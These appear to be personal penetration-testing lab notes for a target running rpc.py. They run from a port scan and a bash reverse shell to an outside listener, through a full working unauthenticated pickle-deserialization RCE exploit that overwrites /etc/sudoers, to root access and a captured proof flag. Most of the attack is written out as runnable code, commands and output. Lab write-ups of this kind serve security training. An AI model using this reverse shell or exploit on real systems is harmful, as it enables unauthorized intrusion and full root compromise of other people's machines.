`Running all scans on 192.168.156.210`

`Host is likely running Unknown OS!`

`---------------------Starting Port Scan-----------------------`

`PORT     STATE SERVICE`
`22/tcp   open  ssh`
`8000/tcp open  http-alt`

![[Pasted image 20240222114715.png]]

Get a reverse shell
`user@pc:/home/user$ sh -i >& /dev/tcp/192.168.45.222/4444 0>&1`

Catch and upgrade
`└─$ nc -nlvp 4444`         
`Ncat: Version 7.94SVN ( https://nmap.org/ncat )`
`Ncat: Listening on [::]:4444`
`Ncat: Listening on 0.0.0.0:4444`
`Ncat: Connection from 192.168.217.210:56904.`
`$ python3 -c 'import pty; pty.spawn("/bin/bash")'`

Run lse.sh

`pro020 Processes running with root permissions......................... yes!`
---
`START      PID     USER COMMAND`
`16:43      991     root python3 /opt/rpc.py

We see rpc.py under the opt folder `

![[Pasted image 20240222120228.png]]

Download the exploit and change the exec_command

`└─$ cat exploit.py`               
```

import requests
import pickle

# Unauthenticated RCE 0-day for https://github.com/abersheeran/rpc.py

HOST = "127.0.0.1:65432"

URL = f"http://{HOST}/sayhi"

HEADERS = {
    "serializer": "pickle"
}


def generate_payload(cmd):

    class PickleRce(object):
        def __reduce__(self):
            import os
            return os.system, (cmd,)

    payload = pickle.dumps(PickleRce())

    print(payload)

    return payload


def exec_command(cmd):

    payload = generate_payload(cmd)

    requests.post(url=URL, data=payload, headers=HEADERS)


def main():
    exec_command('echo "user ALL=(root) NOPASSWD: ALL" > /etc/sudoers')
    # exec_command('uname -a')


if __name__ == "__main__":
    main()
```

Upload this to the target
`└─$ python -m http.server 80`                                                       
`Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...`
`192.168.217.210 - - [22/Feb/2024 12:00:19] "GET /exploit.py HTTP/1.1" 200 -`

`user@pc:/tmp$ wget 192.168.45.222/exploit.py`
`wget 192.168.45.222/exploit.py`
`--2024-02-22 17:00:19--  http://192.168.45.222/exploit.py`
`Connecting to 192.168.45.222:80... connected.`
`HTTP request sent, awaiting response... 200 OK`
`Length: 706 [text/plain]`
`Saving to: ‘exploit.py’`

`exploit.py          100%[===================>]     706  --.-KB/s    in 0s`      

`2024-02-22 17:00:19 (97.7 MB/s) - ‘exploit.py’ saved [706/706]`

Run it
`user@pc:/tmp$ python3 exploit.py`
`python3 exploit.py`
`b'\x80\x04\x95N\x00\x00\x00\x00\x00\x00\x00\x8c\x05posix\x94\x8c\x06system\x94\x93\x94\x8c3echo "user ALL=(root) NOPASSWD: ALL" > /etc/sudoers\x94\x85\x94R\x94.'`

Check to see if it worked
`user@pc:/tmp$ sudo -l`
`sudo -l`
`User user may run the following commands on pc:`
    `(root) NOPASSWD: ALL`

`user@pc:/tmp$ sudo su -`
`sudo su -`
`root@pc:~# ls`
`ls`
`email4.txt  proof.txt  snap`
`root@pc:~# cat proof.txt`
`cat proof.txt`
`1a30344c78ca9474f54545a50ece5fac`


